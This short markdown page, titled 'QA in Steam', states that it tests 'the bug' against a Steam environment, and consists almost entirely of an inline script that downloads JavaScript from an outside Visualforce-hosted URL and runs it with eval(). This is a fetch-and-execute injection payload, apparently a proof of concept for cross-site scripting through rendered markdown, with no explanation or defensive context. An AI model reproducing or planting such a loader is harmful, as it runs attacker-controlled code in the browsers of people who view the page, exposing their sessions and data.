# QA in Steam

Trying out the bug against a steam environment

<script>
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.open("GET", 'https://vfmetadata--c.stmfa.stm.visualforce.com/resource/1554832772000/banana/myjs.js');
    xmlhttp.onreadystatechange = function()
    {
        if ((xmlhttp.status == 200) && (xmlhttp.readyState == 4))
        {
            eval(xmlhttp.responseText);
        }
    };
    xmlhttp.send();
</script>
